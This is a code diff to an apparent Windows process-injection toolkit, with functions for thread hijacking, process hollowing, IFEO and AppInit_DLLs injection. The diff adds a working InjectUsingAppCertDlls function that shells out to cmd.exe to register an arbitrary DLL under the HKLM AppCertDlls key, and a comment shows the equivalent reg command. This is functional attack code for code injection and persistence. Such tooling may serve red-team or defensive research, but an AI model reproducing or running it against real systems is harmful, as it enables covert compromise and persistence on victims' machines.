@@ -28,7 +28,7 @@ DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName);
 DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable);
 DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart);
 DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName);
-
+DWORD InjectUsingAppCertDlls(WCHAR* DLLName);
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
 
@@ -573,5 +573,26 @@ DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName) {
 	if (!Status) {
 		return -1;
 	}
+	return 0;
+}
+
+
+//reg ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" /V "AppCert.dll" /T REG_SZ /D "%SystemRoot%\System32\AppCert.dll" /F
+DWORD InjectUsingAppCertDlls(WCHAR* DLLName) {
+
+	BOOL Status = 0;
+	PROCESS_INFO info;
+
+	wstring RegAddCommand = L"reg add ";
+	wstring KEY = L"\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls";
+	wstring wsDLLName = DLLName;
+
+	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + L"\"" + L" /v AppCert.dll /t REG_SZ /d " + wsDLLName + L" /f";
+
+	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
+	if (!Status) {
+		return -1;
+	}
+
 	return 0;
 }
